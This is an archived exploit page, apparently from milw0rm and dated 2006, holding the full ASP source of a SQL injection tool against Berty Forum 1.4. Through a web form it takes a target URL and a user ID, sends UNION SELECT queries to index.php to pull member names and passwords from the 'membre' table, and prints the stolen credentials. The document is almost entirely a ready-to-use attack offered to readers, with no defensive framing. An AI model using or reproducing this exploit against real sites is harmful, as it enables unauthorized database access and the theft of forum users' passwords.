<html><head><title>Berty Forum <= 1.4 (index.php) Remote Blind SQL Injection Exploit</title></head><pre>&lt;% Response.Buffer = True %&gt;
&lt;% On Error Resume Next %&gt;
&lt;% Server.ScriptTimeout = 100 %&gt;

&lt;%

'===============================================================================================
'[Script Name: Berty Forum &lt;= 1.4(index.php) Remote Blind SQL Injection Exploit
'[Coded by   : ajann
'[Author   : ajann
'[Contact    : :(
'[ExploitName: exploit1.asp
'[Greetz To: ## Tüm Müslüman Aleminin Ramazan Bayrami MUBAREK Olsun , Bir Daha Nasib Olur Ýnsallah ##

'[Note : exploit file name =&gt;exploit1.asp
'[Using : Write Target and ID after Submit Click
'===============================================================================================

%&gt;

&lt;html&gt;
&lt;title&gt;Berty Forum v1.4(index.php) Blind SQL Injection Exploit&lt;/title&gt;
&lt;head&gt;

&lt;script language=&quot;JavaScript&quot;&gt;    
  function functionControl1(){  
        setTimeout(&quot;functionControl2()&quot;,2000);    
     }  
  
  function functionControl2(){  
            if(document.form1.field1.value==&quot;&quot;){  
 
     alert(&quot;[Exploit Failed]=&gt;The Username and Password Didnt Take,Try Again&quot;);
        
                             }  
                        }

  function writetext() {

            if(document.form1.field1.value==&quot;&quot;){
document.getElementById('htmlAlani').innerHTML='&lt;font face=\&quot;Verdana\&quot; size=\&quot;1\&quot; color=\&quot;#008000\&quot;&gt;There is a problem... The Data Didn\'t Take &lt;/font&gt;'

                            }
                 }
  function write(){  
        setTimeout(&quot;writetext()&quot;,1000);    
     }  
  
&lt;/script&gt;


&lt;/head&gt;
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=windows-1254&quot;&gt;
&lt;body bgcolor=&quot;#000000&quot; link=&quot;#008000&quot; vlink=&quot;#008000&quot; alink=&quot;#008000&quot;&gt;

&lt;center&gt;
&lt;font face=&quot;Verdana&quot; size=&quot;2&quot; color=&quot;#008000&quot;&gt;&lt;b&gt;&lt;a href=&quot;exploit1.asp&quot;&gt;Berty Forum &amp;lt;=&lt;/b&gt;v1.4(index.php) &lt;u&gt;&lt;b&gt;
Blind SQL Injection Exploit&lt;/b&gt;&lt;/u&gt;&lt;/a&gt;&lt;/font&gt;&lt;br&gt;&lt;br&gt;
&lt;table border=&quot;1&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; style=&quot;border-collapse: collapse&quot; width=&quot;35%&quot; id=&quot;AutoNumber1&quot; bordercolorlight=&quot;#808080&quot; bordercolordark=&quot;#008000&quot; bordercolor=&quot;#808080&quot;&gt;
  &lt;tr&gt;
    &lt;td width=&quot;50%&quot; bgcolor=&quot;#808000&quot; onmouseover=&quot;javascript:this.style.background='#808080';&quot; onmouseout=&quot;javascript:this.style.background='#808000';&quot;&gt;
    &lt;font face=&quot;Arial&quot; size=&quot;1&quot;&gt;&lt;b&gt;&lt;font color=&quot;#FFFFFF&quot;&gt;TARGET:&lt;/font&gt;Example:[http://x.com/path]&lt;/b&gt;&lt;/font&gt;&lt;p&gt;
    &lt;b&gt;&lt;font face=&quot;Arial&quot; size=&quot;1&quot; color=&quot;#FFFFFF&quot;&gt;USER ID:&lt;/font&gt;&lt;/b&gt;&lt;font face=&quot;Arial&quot; size=&quot;1&quot;&gt;&lt;b&gt;Example:[User 
    ID=1]&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;
    &lt;td width=&quot;50%&quot;&gt;&lt;center&gt;
&lt;form method=&quot;post&quot; name=&quot;form1&quot; action=&quot;exploit1.asp?islem=get&quot;&gt;
&lt;input type=&quot;text&quot; name=&quot;text1&quot; value=&quot;http://&quot; size=&quot;25&quot; style=&quot;background-color: #808080&quot;&gt;&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;id&quot; value=&quot;1&quot; size=&quot;25&quot; style=&quot;background-color: #808080&quot;&gt;
&lt;input type=&quot;submit&quot; value=&quot;Get&quot;&gt;&lt;/center&gt;&lt;/td&gt;
  &lt;/tr&gt;

&lt;/table&gt;

&lt;div id=htmlAlani&gt;&lt;/div&gt;

&lt;%
islem = Request.QueryString(&quot;islem&quot;)    
If islem = &quot;hata1&quot; Then 
Response.Write &quot;&lt;font face=&quot;&quot;Verdana&quot;&quot; size=&quot;&quot;1&quot;&quot; color=&quot;&quot;#008000&quot;&quot;&gt;There is a problem! Please complete to the whole spaces&lt;/font&gt;&quot;
End If
If islem = &quot;hata2&quot; Then 
Response.Write &quot;&lt;font face=&quot;&quot;Verdana&quot;&quot; size=&quot;&quot;1&quot;&quot; color=&quot;&quot;#008000&quot;&quot;&gt;There is a problem! Please right character use&lt;/font&gt;&quot;
End If
If islem = &quot;hata3&quot; Then 
Response.Write &quot;&lt;font face=&quot;&quot;Verdana&quot;&quot; size=&quot;&quot;1&quot;&quot; color=&quot;&quot;#008000&quot;&quot;&gt;There is a problem! Add &quot;&quot;http://&quot;&quot;&lt;/font&gt;&quot;
End If
%&gt;

&lt;%  

If islem = &quot;get&quot; Then

string1=&quot;/index.php?consult=1&amp;indMemo=&quot;
string2=&quot;-1%20union select%20&quot;
string3=&quot;mdp%20&quot;
string4=&quot;from%20&quot;
string5=&quot;membre%20&quot;
string6=&quot;where%20&quot;
string7=&quot;ind like%20&quot;
string8=Request.Form(&quot;id&quot;)
string9=&quot;/index.php?consult=1&amp;indMemo=&quot;
string10=&quot;-1%20union select%20&quot;
string11=&quot;nom%20&quot;
string12=&quot;from%20&quot;
string13=&quot;membre%20&quot;
string14=&quot;where%20&quot;
string15=&quot;ind like%20&quot;
string16=Request.Form(&quot;id&quot;)

targettext = Request.Form(&quot;text1&quot;)
arama=InStr(1, targettext, &quot;union&quot; ,1)
arama2=InStr(1, targettext, &quot;http://&quot; ,1)

If targettext=&quot;&quot; Then
Response.Redirect(&quot;exploit1.asp?islem=hata1&quot;)

Else
If arama&gt;0 then 
Response.Redirect(&quot;exploit1.asp?islem=hata2&quot;)

Else
If arama2=0 then 
Response.Redirect(&quot;exploit1.asp?islem=hata3&quot;)

Else
%&gt; 

&lt;%

target1 = targettext+string1+string2+string3+string4+string5+string6+string7+string8
target2 = targettext+string9+string10+string11+string12+string13+string14+string15+string16

Public Function take(come)
Set objtake = Server.CreateObject(&quot;Microsoft.XMLHTTP&quot; )
With objtake
  .Open &quot;GET&quot; , come, FALSE
  .sEnd
take =  .Responsetext
End With
SET objtake = Nothing
End Function

get_username = take(target1)
get_password = take(target2)

getdata=InStr(get_username,&quot;&quot;&quot;720&quot;&quot; valign=&quot;&quot;top&quot;&quot;&gt;&quot; )
username=Mid(get_username,getdata+19,20)
passwd=Mid(get_password,getdata+19,20)

%&gt;
&lt;center&gt;
&lt;font face=&quot;Verdana&quot; size=&quot;2&quot; color=&quot;#008000&quot;&gt; &lt;u&gt;&lt;b&gt;
ajann&lt;br&gt;&lt;/b&gt;&lt;/u&gt;&lt;/font&gt;
&lt;table border=&quot;1&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; style=&quot;border-collapse: collapse&quot; width=&quot;35%&quot; id=&quot;AutoNumber1&quot; bordercolorlight=&quot;#808080&quot; bordercolordark=&quot;#008000&quot; bordercolor=&quot;#808080&quot;&gt;
  &lt;tr&gt;
    &lt;td width=&quot;50%&quot; bgcolor=&quot;#808000&quot; onmouseover=&quot;javascript:this.style.background='#808080';&quot; onmouseout=&quot;javascript:this.style.background='#808000';&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
    &lt;b&gt;&lt;font size=&quot;2&quot; face=&quot;Arial&quot;&gt;User Name:&lt;/font&gt;&lt;/b&gt;&lt;/td&gt;
    &lt;td width=&quot;50%&quot;&gt;&amp;nbsp;&lt;b&gt;&lt;font color=&quot;#C0C0C0&quot; size=&quot;2&quot; face=&quot;Verdana&quot;&gt;&lt;%=username%&gt;&lt;/font&gt;&lt;/b&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td width=&quot;50%&quot; bgcolor=&quot;#808000&quot; onmouseover=&quot;javascript:this.style.background='#808080';&quot; onmouseout=&quot;javascript:this.style.background='#808000';&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
    &lt;b&gt;&lt;font size=&quot;2&quot; face=&quot;Arial&quot;&gt;&amp;nbsp;User Password:&lt;/font&gt;&lt;/b&gt;&lt;/td&gt;
    &lt;td width=&quot;50%&quot;&gt;&amp;nbsp;&lt;b&gt;&lt;font color=&quot;#C0C0C0&quot; size=&quot;2&quot; face=&quot;Verdana&quot;&gt;&lt;%=passwd%&gt;&lt;/font&gt;&lt;/b&gt;&lt;/td&gt;
  &lt;/tr&gt;

&lt;/table&gt;

&lt;form method=&quot;POST&quot; name=&quot;form2&quot; action=&quot;#&quot;&gt;    
&lt;input type=&quot;hidden&quot; name=&quot;field1&quot; size=&quot;20&quot; value=&quot;&lt;%=passwd%&gt;&quot;&gt;&lt;/p&gt;      
&lt;/form&gt; 

&lt;/center&gt;

&lt;script language=&quot;JavaScript&quot;&gt;
write()
functionControl1()
&lt;/script&gt;

&lt;/body&gt;
&lt;/html&gt;

&lt;%
End If
End If
End If
End If
Set objtake = Nothing 
%&gt;

# milw0rm.com [2006-10-24]</pre></html>